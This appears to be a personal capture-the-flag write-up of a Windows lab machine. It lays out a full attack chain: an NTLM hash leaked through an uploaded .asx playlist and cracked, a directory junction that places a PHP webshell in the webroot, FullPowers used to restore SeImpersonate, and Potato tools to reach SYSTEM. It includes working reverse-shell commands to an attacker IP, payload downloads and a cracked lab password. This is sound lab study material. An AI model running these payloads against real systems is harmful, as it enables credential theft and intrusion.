
**Full chain:**

web upload → **`.asx` WMP playlist → NTLM leak** → crack **enox** `1234virus@` → **SSH** → **junction** the upload folder into the webroot → **PHP webshell (Local Service)** → **FullPowers** restores **SeImpersonate** → **Potato → SYSTEM**


---

## Phase 1 — Enumerate

Apache/PHP (XAMPP) on Windows, plus SSH and RDP. Dirs seen: `phpMyAdmin`, `webalizer`, `licenses`, `server-status`, `assets` (only assets accessible). The page has a **video upload** + a **contact form**.

**Rabbit holes I burned time on (normal — note and move on):**

- **XSS** on the contact form → nothing.
- **Reverse-shell / PHP webshell upload** → no output. **Why:** uploads don't land under the webroot (they go to another path which i couldnot find at the beginning), so there's no URL to trigger them. *(Hold that thought — it becomes the root trick in Phase 4.)*

---

## Phase 2 — Foothold: NTLM leak via a media playlist

The upload accepts media files, and a **server-side "review" process opens them with Windows Media Player**. A WMP **playlist** can point at a **remote SMB path** → when the player resolves it, Windows **authenticates over NTLM** to my box → I capture the hash.

Start a listener, then upload this `.asx`:

```bash
sudo responder -I tun0
```

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://10.10.15.249\share\track.mp3" />
  </entry>
</asx>
```

→ captured **enox**'s NTLMv2. Crack it, confirm, log in:

```bash
hashcat -m 5600 enox.hash /usr/share/wordlists/rockyou.txt
```

→ **`enox : 1234virus@`** → `ssh enox@<ip>` → **foothold**. 🎉

### 🔎 NTLM LEAK via FILE (coercion) — quick reference

**When to use this:** a target opens/processes a **file you supply** (upload, email, share) with a Microsoft app, and you can't get direct code exec. Make the file reference a **remote SMB resource** so the app authenticates to you.

**How do I know I can abuse it:** there's an upload/open feature, outbound **SMB (445)** to you isn't blocked, and the file type is one of the "leaky" formats below.

 **Then:** `responder -I tun0` (or `ntlmrelayx` to **relay** it) → catch NTLMv2 → `hashcat -m 5600` to crack.

**If it fails:** no hash = SMB egress blocked (try a WebDAV `http://` reference instead), or the app never opened your file (wrong extension / not processed).

### 🔖 Reference — NTLM file-leak formats (Morphisec "5 NTLM vulnerabilities" blog)

If a box lets you drop one of these into something that gets opened, think **NTLM leak** and reopen that blog https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/:

- **`.rtf` (MS Word)** — malicious auto **LINK** field → SMB existence check (fires even if you decline the prompt).
- ** MS Outlook `<img>`** — HTML email image `src` to your SMB server, auto-fetched on open.
- **`.accdb` (MS Access)** — AutoExec macro refreshes a **remote table** over SMB before the enable-content prompt.
- **`.wax` / `.wvx` / `.wmx` / `.asx` (Windows Media Player)** — playlist points at remote media. ⬅️ **this box**
- **`.pub` (MS Publisher)** — mail-merge recipient list points at a remote file; existence check authenticates.

All the same idea: *reference a remote resource → the app authenticates to you.*

---

## Phase 3 — Orient on the host (answers to "how did they know?")

"How did they know to look in C:\xampp\htdocs?" Banner = Apache + PHP = XAMPP, whose default webroot is C:\xampp\htdocs. Once you have a shell, you read the running site's source to understand the upload logic / find creds → so you go to its webroot. Standard move: "where does the website actually live?"

XAMPP passwords.txt — does it help? No. It ships with XAMPP as docs of default passwords (MySQL root blank, WebDAV, Mercury…). Not planted loot — ignore.

MySQL dead end. ERROR 2002 ... (10061) = connection refused = MySQL service not running. Rabbit hole — move on.

wmplayer version hunting — dead end. Version 12.0.20348.1, searchsploit empty. The real WMP skin bugs (MS01-010 / CVE-2007-3035, .wmz/.wmd) are ancient and patched. This box is not a WMP CVE.

⚠️ The trap I fell into — review.ps1. In enox's Documents there's a review.ps1 (the "review bot" that opens uploaded media with wmplayer). I assumed a privileged scheduled task ran it and chased that for root. Wrong — review.ps1 is just the thing that opens your upload, i.e. the Phase 2 NTLM-leak trigger, not a privesc. Lesson: a bot that opens your input is a trigger primitive (leak/relay), not automatically an escalation. Confirm who runs the privileged thing before theorizing. The real root is below.

---

## Phase 4 — Root step 1: junction the upload folder into the webroot → webshell

**The problem:** uploads land in `C:\Windows\Tasks\Uploads\<folder>\`, which **Apache doesn't serve** — so an uploaded PHP shell has no URL (this is why Phase 1's webshells failed).

**The trick:** as **enox** I can delete and recreate that upload folder, but not the htdocs directory (check read, write permission with `icacls`), so I replace it with a **directory junction** pointing at the **webroot**. Now whatever the form uploads physically lands **inside `C:\xampp\htdocs`** → reachable at `http://host/shell.php` → PHP runs.

### 💡 What even IS a junction? 

A **junction** is a **fake folder that's secretly a doorway to another folder.** It looks like a normal folder, but anything dropped into it actually ends up somewhere else — wherever you pointed it.

 Think of it as **mail forwarding**: you set up an address 
 (`C:\Windows\Tasks\Uploads\d41d8...`), but every letter sent there gets auto-forwarded to a *different* address (`C:\xampp\htdocs`). The sender (the upload app) thinks it's dropping files in Uploads — it has no idea they're really landing in the webroot.

**Why that beats "Access denied" on htdocs:** building the doorway only needs write permission where the **doorway lives** (the Uploads folder, which you control), **not** where it **points to** (htdocs, which you can't write to). The uploaded files get *carried through* the doorway into htdocs — you were never allowed to create a folder there yourself, and you don't need to be.

**Vocabulary (so walkthroughs stop being cryptic):**

- **junction / symlink / "mklink"** = "this folder/file is really a pointer to another one."
- **`mklink /J <doorway> <real target>`** (cmd) or **`New-Item -ItemType Junction -Path <doorway> -Target <real target>`** (PowerShell) = build the doorway. **Path/doorway = where you CAN write; Target = where you WANT the files to appear.**
- Linux equivalent = a **symbolic link**: `ln -s <real target> <doorway>`.

**Why it's a hacking technique:** you trick a program into writing its files somewhere it never meant to — a web folder, a Startup folder, or over a config file — by swapping a folder it trusts for a doorway to somewhere juicier.

**When to use this:** a process writes files to a directory **you control**, but that directory isn't useful (not web-served, not executed). **Redirect the directory** so the writes land somewhere that *is* useful (webroot, a Startup folder, a config dir).

**How do I know I can abuse it:** you can **delete/recreate** that directory (`icacls` shows you have the rights), and you know a **better destination** that gets you code exec.

**Do it:** `rmdir` the real folder → `mklink /J <folder> <target>` (junction, no admin needed). Linux equivalent: `ln -s`.


**The folder name:** `index.php` builds the subfolder as an **MD5 of the form's first/last/email fields concatenated** as per the `index.php` code in `htdocs`. So the name is **predictable**:
- You can either Leave them **blank** → it hashes an empty string → folder = `d41d8cd98f00b204e9800998ecf8427e` (= `md5("")`, worth memorizing).
- OR Fill them in → folder = md5 of those values (e.g. 0xdf's run produced `33d81ad509ef34a2635903babb285882`).

Either way, you **know the folder name in advance**, so you know exactly which folder to turn into the junction. Use whichever values you submit — simplest is blank.


```cmd
:: cmd
cd C:\Windows\Tasks\Uploads

del d41d8cd98f00b204e9800998ecf8427e

rmdir d41d8cd98f00b204e9800998ecf8427e

cmd /c mklink /J C:\Windows\Tasks\Uploads\d41d8cd98f00b204e9800998ecf8427e C:\xampp\htdocs
```
```powershell
# PowerShell equivalent
Remove-Item 'C:\Windows\Tasks\Uploads\d41d8cd98f00b204e9800998ecf8427e' -Recurse -Force

New-Item -ItemType Junction -Path 'C:\Windows\Tasks\Uploads\d41d8cd98f00b204e9800998ecf8427e' -Target 'C:\xampp\htdocs'
```

Upload a one-liner PHP shell through the **normal web form** (name/email blank so it uses that folder), then hit it:

```php
<?php system($_GET['cmd']); ?>
```

you can check if the shell file lands on htdocs or not to be sure. If it lands, then:

```bash
curl "http://10.129.x.x/shell.php?cmd=whoami"
```

→ runs as the XAMPP service account: **`nt authority\local service`**. RCE. 🎉


**If it fails:** folder not empty → delete contents first; "access denied" on `mklink` → you don't own the parent; still 404 → wrong folder name (recompute the hash) or app writes a different subpath.



---

## Phase 5 — Root step 2: Local Service has a STRIPPED token → FullPowers

`whoami /priv` (from a PowerShell reverse shell spawned through the webshell) shows a **restricted set** — crucially **`SeImpersonatePrivilege` is NOT in the list at all** ( the privileges "have been limited to prevent exploitation"):

```
SeTcbPrivilege                 Disabled
SeChangeNotifyPrivilege        Enabled
SeCreateGlobalPrivilege        Enabled
SeIncreaseWorkingSetPrivilege  Disabled
SeTimeZonePrivilege            Disabled
```

**In plain words:** the one privilege my potato attack needs — **`SeImpersonatePrivilege`** — is **not on this list at all**. It's not sitting there "Disabled" waiting to be switched on; it's simply **gone**. So right now I *cannot* do the potato step. I have to get that privilege back first (that's the next phase, FullPowers).

**💡 What is `SeTcbPrivilege`?** 

TCB = **"Trusted Computing Base."** This privilege means **"act as part of the operating system"** — it's one of the **most powerful privileges on Windows**, basically "I am the OS itself," letting a process create tokens and act as any user (an instant path to SYSTEM). You'd normally be thrilled to see it. **But here it's `Disabled`, and that's a trap:** `SeTcbPrivilege` can only be *enabled* by a process that already has it in an **enabled** state or by SYSTEM — a normal restricted shell like ours **can't flip it on**, so it's useless to us right now. It's a shiny distraction; the privilege we can actually turn into SYSTEM is `SeImpersonatePrivilege`, and that one is missing. *(General rule: a privilege in the list but `Disabled` is sometimes enable-able, but the truly dangerous ones like SeTcb are locked unless you're already very privileged. Don't get stuck trying to enable it.)*

**Why is SeImpersonate missing at all?** 

Service accounts (**Local Service / Network Service**) *normally* hold `SeImpersonatePrivilege` and `SeAssignPrimaryTokenPrivilege`. But Windows can hand a process a **"filtered" (cut-down) token** depending on how it was started — and here, because our shell was launched **through the web server**, those two privileges were **removed entirely** (not just disabled) to make exploitation harder. Because they're *removed*, you can't simply "enable" them — you have to **respawn the account** to get its **full normal privilege set** back. That respawn is exactly what **FullPowers** does (next phase).

**The key distinction to remember:**

- **Disabled** = the privilege is still *in your list*; often you (or a tool) can just **turn it on**. ← like POV machine's SeDebug.
- **Missing/removed** = it's *not in your list at all*; you can't enable what isn't there — you must **respawn** to restore it. ← Media's SeImpersonate, fixed by FullPowers

**FullPowers** respawns the account with its **default privileges restored** (via a scheduled-task trick). 

**Step 1:** **First, in enox's shell transfer `fullpowers.exe` and `nc.exe` :**

```powershell
cd C:\Windows\Tasks\Uploads

iwr http://ip:port/FullPowers.exe -OutFile FullPowers.exe

iwr http://ip:port/nc.exe -OutFile nc.exe

# you can use certutil too!
certutil -urlcache -f http://ip:port/file.exe C:\Windows\Tasks\Uploads\file.exe
```

**Step 2**:  **Starting a listener, Catch a interactive shell for this `nt authority\local service`**

```bash
curl "http://10.129.234.67/p.php?cmd=C:\Windows\Tasks\Uploads\nc.exe+10.10.15.249+4444+-e+cmd.exe"
```


**Step 3:**  **Start another listener to get the next elevated shell** 

```bash
rlwrap -cAr nc -lnvp 4445
```

**Step 4:** **Run FullPowers** with In the Local Service shell that payload as its `-c` command (you can either run it with `nc` or Make a base64 PowerShell reverse shell pointing at YOUR ip + a port (revshells.com → “PowerShell #3 (Base64)”)):

```powershell

.\FullPowers.exe -c "powershell.exe -nop -w hidden -e <base64 revshell>" -z
# option 1: with base64

C:\Windows\Tasks\Uploads\FullPowers.exe -c "C:\Windows\Tasks\Uploads\nc.exe 10.10.15.249 4445 -e cmd.exe"
# option 2: with nc
```

Catch the new shell → `whoami /priv` now shows the **full default set, including `SeImpersonatePrivilege`**:

```
SeAssignPrimaryTokenPrivilege  Enabled
SeIncreaseQuotaPrivilege       Enabled
SeAuditPrivilege               Enabled
SeChangeNotifyPrivilege        Enabled
SeImpersonatePrivilege         Enabled   ⬅️ the one we need
SeCreateGlobalPrivilege        Enabled
SeIncreaseWorkingSetPrivilege  Enabled
```

### 🔎 FullPowers — quick reference

**When to use this:** RCE **as Local Service / Network Service** but `whoami /priv` is missing `SeImpersonatePrivilege` / `SeAssignPrimaryToken`.

 **How do I know I need it:** you're a service account and a Potato complains it has no impersonation privilege → run FullPowers first, re-check `whoami /priv`.

---

## Phase 6 — Root step 3: SeImpersonate → SYSTEM (Potato)

With **SeImpersonatePrivilege** back, this is a textbook **Potato**.

**🧠 The big reusable rule — match the privilege to the tool:**

| You have…                                                        | Use…                                                     |
| ---------------------------------------------------------------- | -------------------------------------------------------- |
| SeImpersonatePrivilege / SeAssignPrimaryToken (service accounts) | PrintSpoofer, GodPotato, RoguePotato ← this box          |
| SeDebugPrivilege                                                 | migrate / PPID-spoof / token-steal → [[pov-htb-writeup]] |
Counterpart to POV: there SeDebug → process injection; here SeImpersonate → Potato. Same goal, different privilege, different tool.

#### **Option 1 — GodPotato (the reliable route):**

If you want to confirm the godpotato version matched with target before uploading, check with `dir C:\Windows\Microsoft.NET\Framework\`. Then you can upload it (e.g. as `gp.exe`) and run your payload as SYSTEM:

```cmd
.\gp.exe -cmd "cmd /c whoami"
.\gp.exe -cmd "powershell -e <base64 revshell>"

or

.\gc.exe -cmd "C:\Windows\Tasks\Uploads\n.exe 10.10.15.249 8877 -e cmd.exe"
```

→ shell as `nt authority\system`.

#### **Option 2 — PrintSpoofer** (clean one-liner, also fine):

```cmd
.\PrintSpoofer64.exe -i -c cmd

.\PrintSpoofer64.exe -c "C:\Windows\Tasks\Uploads\nc.exe 10.10.14.6 443 -e cmd.exe"
```

#### **Option 3 — Metasploit `getsystem`** 

From a meterpreter running as Local-Service-with-SeImpersonate, `getsystem` auto-runs a named-pipe/potato technique → SYSTEM.

**Which potato?** **GodPotato** is the most reliable on modern Windows (2019/2022/Win11) and is what the main writeups use here — reach for it first. **PrintSpoofer** is the simplest if the named pipe is reachable. **JuicyPotato is dead** on Server 2019+/Win10 1809+. All of them need **SeImpersonate** — that's the whole reason Phase 5 (FullPowers) mattered.

```cmd
type C:\Users\Administrator\Desktop\root.txt
```
```powershell
# PowerShell equivalent
Get-Content C:\Users\Administrator\Desktop\root.txt
```

**SYSTEM.** 👑 Box done.

**Note on the `.exe` tools (FullPowers / GodPotato / PrintSpoofer):** the `.\tool.exe ...` invocations run **the same in cmd and PowerShell** — in both you need the leading `.\` to run from the current dir. Only the *built-in* commands differ between shells (that's what the PS blocks above cover): `del`/`rmdir`→`Remove-Item`, `mklink /J`→`New-Item -ItemType Junction`, `type`→`Get-Content`, `copy`→`Copy-Item`, `whoami /priv` is a real exe so it's identical.

---

## 🧭 Full chain (one glance)

```
web upload opened by review bot ──(.asx → remote SMB)──► NTLM leak ─► crack ─► SSH as enox
      │  uploads go to C:\Windows\Tasks\Uploads (NOT web-served)
      ▼
mklink /J that folder ──► C:\xampp\htdocs        (junction redirect)
      │  upload PHP shell → now in the webroot
      ▼
RCE as LOCAL SERVICE (stripped token)
      │
      ▼  FullPowers  (respawn → restore SeImpersonatePrivilege)
SeImpersonate ──► GodPotato (or PrintSpoofer / getsystem) ──► SYSTEM
```

## Takeaways

1. **Upload not web-served can still be processed server-side** → think **NTLM leak**, not webshell. Media/Office files that reference remote SMB (`.asx/.wax/.wvx/.wmx`, `.rtf`, `.accdb`, `.pub`, Outlook `<img>`) → `responder` → `hashcat -m 5600`.
2. **A bot that opens your input = a trigger primitive** (leak/relay), **not** automatically a privesc — confirm *who* runs the privileged thing. (My `review.ps1` trap.)
3. **XAMPP → webroot `C:\xampp\htdocs`.** `passwords.txt` = default docs, not loot. MySQL `10061` = service down = rabbit hole. Don't version-hunt wmplayer.
4. **Upload lands somewhere not web-served? Junction it** (`mklink /J`) into the webroot. General pattern: *process writes to a path you control → point that path somewhere that gets you code exec.*
5. **`d41d8cd98f00b204e9800998ecf8427e` = `md5("")`** → "blank input got hashed."
6. **Service account with a stripped token → `FullPowers`** restores `SeImpersonatePrivilege`.
7. **Match the privilege to the tool:** **SeImpersonate → Potato** (PrintSpoofer/GodPotato; JuicyPotato dead on modern Windows); **SeDebug → injection** ([[pov-htb-writeup]]).
